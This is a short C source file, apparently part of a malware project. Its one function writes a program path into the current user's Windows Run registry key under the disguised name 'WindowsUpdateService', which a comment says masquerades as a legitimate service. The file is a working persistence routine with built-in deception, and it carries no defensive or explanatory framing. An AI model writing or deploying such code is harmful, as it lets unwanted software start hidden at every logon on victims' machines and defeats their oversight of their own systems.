#include "pers.h"

BOOL SetPersReg(const WCHAR* appPath) {
	HKEY hKey;
	if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) != ERROR_SUCCESS) {
		return FALSE;
	}
	// Set a disguised key name (masquerading as a legitimate service)
	const WCHAR* fakeKeyName = L"WindowsUpdateService";
	if (RegSetValueExW(hKey, fakeKeyName, 0, REG_SZ, (BYTE*)appPath, (wcslen(appPath) + 1) * sizeof(WCHAR)) != ERROR_SUCCESS) {
		RegCloseKey(hKey);
		return FALSE;
	}

	RegCloseKey(hKey);
	return TRUE;
}